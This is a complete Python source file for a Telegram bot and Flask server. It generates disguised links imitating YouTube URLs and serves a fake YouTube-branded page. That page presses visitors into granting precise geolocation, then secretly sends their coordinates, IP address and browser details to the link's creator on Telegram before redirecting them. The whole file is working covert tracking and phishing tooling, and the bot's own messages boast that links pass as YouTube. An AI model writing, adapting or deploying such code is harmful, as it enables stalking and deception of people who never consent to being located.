import os
import secrets
import sqlite3
import sys
import pkgutil
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler

# Fix for Python 3.14 - Flask compatibility
if not hasattr(pkgutil, 'get_loader'):
    import importlib
    def get_loader(module_name):
        try:
            return importlib.util.find_spec(module_name).loader
        except AttributeError:
            return None
    pkgutil.get_loader = get_loader

# Configuration
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    raise ValueError("No TELEGRAM_TOKEN set")

BASE_URL = os.environ.get('BASE_URL', 'https://youtube-com-t2rz.onrender.com')

# Only YouTube brand
FAKE_DOMAINS = {
    'youtube': {
        'path': 'youtube.com/watch',
        'name': 'YouTube',
        'icon': '▶️',
        'color': '#FF0000',
        'gradient': 'linear-gradient(135deg, #FF0000 0%, #cc0000 100%)',
        'favicon': 'https://www.youtube.com/favicon.ico'
    }
}

# Conversation states - simplified to just WEBSITE_INPUT
WEBSITE_INPUT = 1

# Initialize Flask app
app = Flask(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY, 
                  user_id TEXT,
                  website_url TEXT,
                  brand TEXT,
                  created_at TIMESTAMP,
                  status TEXT,
                  chat_id TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TIMESTAMP,
                  user_agent TEXT,
                  ip_address TEXT)''')
    conn.commit()
    conn.close()

init_db()

def generate_link(user_id, website_url, brand, chat_id):
    link_id = secrets.token_urlsafe(16)
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("INSERT INTO links (link_id, user_id, website_url, brand, created_at, status, chat_id) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (link_id, user_id, website_url, brand, datetime.now(), 'active', chat_id))
    conn.commit()
    conn.close()
    
    brand_info = FAKE_DOMAINS.get(brand, FAKE_DOMAINS['youtube'])
    fake_path = brand_info['path']
    return f"{BASE_URL}/{fake_path}/{link_id}"

@app.route('/<path:fake_path>/<link_id>')
def fake_domain_track(fake_path, link_id):
    # Only YouTube brand
    brand = 'youtube'
    
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("SELECT website_url, status FROM links WHERE link_id = ? AND brand = ?", (link_id, brand))
    result = c.fetchone()
    conn.close()
    
    if not result:
        return "Invalid link", 404
    
    website_url, status = result
    brand_info = FAKE_DOMAINS['youtube']
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>YouTube</title>
        <link rel="icon" href="https://www.youtube.com/favicon.ico">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                background: linear-gradient(135deg, #FF0000 0%, #cc0000 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }}
            .container {{
                background: white;
                border-radius: 20px;
                padding: 40px;
                max-width: 400px;
                width: 100%;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                text-align: center;
            }}
            .brand-icon {{ font-size: 80px; margin-bottom: 10px; }}
            .brand-name {{ color: #FF0000; font-size: 28px; font-weight: bold; }}
            .subtitle {{ color: #666; margin: 10px 0 30px 0; font-size: 16px; }}
            .status {{
                background: #f0f0f0;
                padding: 15px;
                border-radius: 10px;
                margin-bottom: 20px;
                font-size: 14px;
                color: #555;
            }}
            .loading {{
                display: inline-block;
                width: 40px;
                height: 40px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #FF0000;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
            .btn {{
                background: #FF0000;
                color: white;
                border: none;
                padding: 12px 30px;
                border-radius: 25px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 15px;
                display: none;
            }}
            .btn:hover {{ opacity: 0.9; }}
            .privacy {{ color: #999; font-size: 12px; margin-top: 20px; }}
            .youtube-logo {{
                font-size: 48px;
                margin: 10px 0;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="youtube-logo">▶️</div>
            <div class="brand-name">YouTube</div>
            <div class="subtitle">Continue to YouTube</div>
            <div class="status" id="status">📍 Requesting location...</div>
            <div class="loading" id="loader"></div>
            <button class="btn" id="retryBtn" onclick="retryLocation()">🔄 Retry</button>
            <div class="privacy">🔒 Location is only used for this session</div>
        </div>
        
        <script>
            const linkId = '{link_id}';
            const redirectUrl = '{website_url}';
            const statusEl = document.getElementById('status');
            const loader = document.getElementById('loader');
            const retryBtn = document.getElementById('retryBtn');
            let attempts = 0;
            
            function sendLocation(position) {{
                const {{latitude, longitude, accuracy}} = position.coords;
                statusEl.textContent = '✅ Location captured! Redirecting...';
                statusEl.style.background = '#4CAF50';
                statusEl.style.color = 'white';
                loader.style.display = 'none';
                retryBtn.style.display = 'none';
                
                fetch('/capture', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        link_id: linkId,
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy,
                        user_agent: navigator.userAgent
                    }})
                }})
                .then(response => response.json())
                .then(data => {{
                    if (data.success) {{
                        window.location.href = redirectUrl;
                    }}
                }})
                .catch(() => {{
                    statusEl.textContent = '❌ Error. Retrying...';
                    statusEl.style.background = '#ff9800';
                    statusEl.style.color = 'white';
                    setTimeout(retryLocation, 2000);
                }});
            }}
            
            function handleError(error) {{
                attempts++;
                if (attempts < 3) {{
                    statusEl.textContent = `⚠️ Attempt ${{attempts}}/3: Allow location access`;
                    statusEl.style.background = '#ff9800';
                    statusEl.style.color = 'white';
                    setTimeout(retryLocation, 3000);
                }} else {{
                    statusEl.textContent = '❌ Please allow location access';
                    statusEl.style.background = '#f44336';
                    statusEl.style.color = 'white';
                    loader.style.display = 'none';
                    retryBtn.style.display = 'inline-block';
                }}
            }}
            
            function retryLocation() {{
                if (navigator.geolocation) {{
                    statusEl.textContent = '🔄 Requesting location...';
                    statusEl.style.background = '#f0f0f0';
                    statusEl.style.color = '#555';
                    loader.style.display = 'inline-block';
                    retryBtn.style.display = 'none';
                    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {{
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }});
                }}
            }}
            
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {{
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }});
            }} else {{
                statusEl.textContent = '❌ Geolocation not supported';
                statusEl.style.background = '#f44336';
                statusEl.style.color = 'white';
                loader.style.display = 'none';
            }}
        </script>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture_location():
    data = request.json
    link_id = data.get('link_id')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    user_agent = data.get('user_agent')
    ip_address = request.remote_addr
    
    # Save to database
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("""INSERT INTO locations 
                 (link_id, latitude, longitude, accuracy, timestamp, user_agent, ip_address)
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
              (link_id, latitude, longitude, accuracy, datetime.now(), user_agent, ip_address))
    
    # Get chat_id
    c.execute("SELECT chat_id FROM links WHERE link_id = ?", (link_id,))
    result = c.fetchone()
    conn.commit()
    conn.close()
    
    # Send notification to user
    if result:
        chat_id = result[0]
        try:
            # Create bot instance
            bot = Bot(token=TELEGRAM_TOKEN)
            
            # Create new event loop for this request
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            # Send location
            loop.run_until_complete(bot.send_location(
                chat_id=chat_id, 
                latitude=latitude, 
                longitude=longitude
            ))
            
            # Send message
            loop.run_until_complete(bot.send_message(
                chat_id=chat_id,
                text=f"📍 *Location Captured!*\n\n"
                     f"Coordinates: {latitude:.6f}, {longitude:.6f}\n"
                     f"Accuracy: {accuracy} meters\n"
                     f"Link ID: {link_id[:12]}...",
                parse_mode='Markdown'
            ))
            
            loop.close()
            print(f"✅ Location sent to chat_id: {chat_id}")
            
        except Exception as e:
            print(f"❌ Error sending location: {e}")
    
    return jsonify({'success': True})

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'timestamp': datetime.now().isoformat()})

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # YouTube is the only option - directly ask for website URL
    await update.message.reply_text(
        "🎯 *YouTube Location Tracker*\n\n"
        "📝 *Please send me the website URL* where you want to redirect users after location capture.\n\n"
        "Example: `https://your-website.com`\n\n"
        "Or send `/cancel` to cancel.",
        parse_mode='Markdown'
    )
    
    # Store that we're using YouTube
    context.user_data['brand'] = 'youtube'
    
    return WEBSITE_INPUT

async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)
    website_url = update.message.text.strip()
    brand = context.user_data.get('brand', 'youtube')
    
    if not website_url.startswith(('http://', 'https://')):
        website_url = 'https://' + website_url
    
    if '.' not in website_url:
        await update.message.reply_text(
            "❌ Invalid URL. Send like: https://example.com",
            parse_mode=None
        )
        return WEBSITE_INPUT
    
    link = generate_link(user_id, website_url, brand, chat_id)
    brand_info = FAKE_DOMAINS['youtube']
    
    keyboard = [
        [InlineKeyboardButton("📋 Copy YouTube Link", url=link)],
        [InlineKeyboardButton("🔄 Generate New Link", callback_data='new_link')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ *YouTube Link Generated!*\n\n"
        f"🔗 {link}\n\n"
        f"🎭 Looks like: {brand_info['path']}\n"
        f"🌐 Redirects to: {website_url}\n\n"
        f"Share this link - it looks like a YouTube link!",
        reply_markup=reply_markup,
        parse_mode=None
    )
    
    return ConversationHandler.END

async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🎯 *YouTube Location Tracker*\n\n"
        "📝 *Please send me the website URL* for this new link.\n\n"
        "Example: `https://your-website.com`\n\n"
        "Or send `/cancel` to cancel.",
        parse_mode='Markdown'
    )
    
    context.user_data['brand'] = 'youtube'
    
    return WEBSITE_INPUT

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❌ Cancelled. Send /start to begin again.",
        parse_mode=None
    )
    return ConversationHandler.END

def main():
    # Force single instance
    os.environ["WEB_CONCURRENCY"] = "1"
    
    # Fix for Python 3.14+ event loop issue
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Create conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            WEBSITE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_website),
                CommandHandler('cancel', cancel)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    # Add conversation handler
    application.add_handler(conv_handler)
    
    # Add a separate handler for /start to reset conversation
    application.add_handler(CommandHandler('start', start), group=1)
    
    # Add other handlers
    application.add_handler(CallbackQueryHandler(new_link, pattern='^new_link$'))
    
    # Start Flask in background with single thread
    import threading
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(
        target=lambda: app.run(
            host='0.0.0.0', 
            port=port, 
            debug=False, 
            use_reloader=False,
            threaded=False
        ),
        daemon=True
    ).start()
    
    # Start bot with cleanup
    try:
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            stop_signals=None
        )
    except Exception as e:
        print(f"Bot error: {e}")

if __name__ == "__main__":
    main()
